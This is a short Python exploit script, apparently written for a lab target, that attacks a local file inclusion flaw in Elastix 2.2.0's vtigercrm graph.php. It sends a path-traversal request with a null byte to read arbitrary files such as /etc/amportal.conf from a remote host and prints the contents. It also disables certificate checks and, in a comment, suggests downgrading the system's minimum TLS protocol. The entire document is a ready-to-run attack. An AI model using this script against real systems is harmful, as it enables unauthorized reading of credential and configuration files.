#!/usr/bin/python
#p1x1
#LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&module=Accounts&action

from colorama import Fore,init
import requests, sys, urllib3
from pwn import *


init()

def usage():
	print Fore.RED+"\n[+] Usage : python %s <rhost> <path>" % (sys.argv[0])
	print "[-] Example : python %s 10.10.10.7 /etc/amportal.conf\n" % (sys.argv[0])

def lfi(rhost, file):

	s = None
	urllib3.disable_warnings()
	s = requests.session()
	s.verify = False

	#BANNER
	print Fore.GREEN+"[+] LFI ELASTIX 2.2.0 [+]"

#	[!] for SSL UNSUPORTED PROTOCOL ERROR  --->  sed -i 's/MinProtocol = TLSv1.2/MinProtocol = TLSv1.0/' /etc/ssl/openssl.cnf")
	url = "https://"+rhost+"/vtigercrm/graph.php?current_language=../../../../../../../../"+file+"%00&module=Accounts&action"
	result = s.get(url)
	print "-"*70
	print(result.text)
	print "-"*70



if __name__ == '__main__' :

	if len(sys.argv) == 3:
		rhost = sys.argv[1]
		file = sys.argv[2]
		lfi(rhost, file)
	else:
		usage()
